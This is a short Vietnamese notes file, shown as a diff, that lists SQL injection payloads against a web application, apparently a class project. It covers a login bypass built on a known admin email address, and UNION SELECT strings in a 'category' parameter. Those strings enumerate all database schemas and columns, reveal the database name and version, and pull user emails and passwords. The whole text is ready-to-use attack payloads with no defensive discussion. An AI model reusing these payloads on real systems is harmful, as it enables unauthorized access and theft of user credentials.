@@ -1,0 +1,15 @@
+- Log in admin khi biết trước email admin:
+    + email: minhchanh.lmc@gmail.com'or '1'='0
+    + pass: abc
+
+
+- Select được toàn bộ tên database và columns có trong server:
+    + category = ' UNION SELECT table_schema,table_name,column_name, null, null, null, null, null, null, null FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'union SELECT * FROM products WHERE '1'='0
+
+- Select được database/version hiện tại:
+    +category = ' union select DATABASE(), Version(), null, null, null, null, null, null, null, null union select * from products where '1'='0
+
+
+- Lấy được toàn bộ thông tin trong các database có trong server:
+    ví dụ: table users trong database hiện tại: is335
+        + category = ' union select USER_EMAIL, USER_PASSWORD, null, null, null, null, null, null, null, null from users union select * from products where '1'='0
